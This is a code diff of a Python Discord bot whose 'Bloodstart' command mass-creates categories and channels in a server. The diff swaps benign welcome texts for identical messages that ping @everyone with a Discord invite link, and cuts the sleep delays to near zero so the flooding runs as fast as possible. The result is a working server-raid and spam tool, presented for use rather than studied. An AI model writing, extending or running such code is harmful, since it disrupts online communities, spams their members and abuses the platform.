@@ -19,7 +19,7 @@ async def on_ready():
     print(f"✅ Logged in as {bot.user}")
 
 @bot.command()
-async def Bloodstart(ctx, delay: float = 0.02):
+async def Bloodstart(ctx, delay: float = 0.0002):
     guild = ctx.guild
 
     if not guild.me.guild_permissions.manage_channels:
@@ -39,11 +39,11 @@ async def Bloodstart(ctx, delay: float = 0.02):
         category = await guild.create_category(f"🩸 BLOOD CATEGORY {count}")
 
         messages = [
-            "Welcome to bloodtime-1!",
-            "Welcome to bloodtime-2!",
-            "Welcome to bloodtime-3!",
-            "Welcome to bloodtime-4!",
-            "Welcome to bloodtime-5!"
+            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
+            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
+            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
+            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone !",
+            "Welcome to bloodtime https://discord.gg/PZ6ENuKdye @everyone  !"
         ]
 
         for i in range(5):
@@ -55,7 +55,7 @@ async def Bloodstart(ctx, delay: float = 0.02):
                 category=category
             )
             await channel.send(messages[i])
-            await asyncio.sleep(0.01)
+            await asyncio.sleep(0.000001)
 
         count += 1
         await asyncio.sleep(delay)
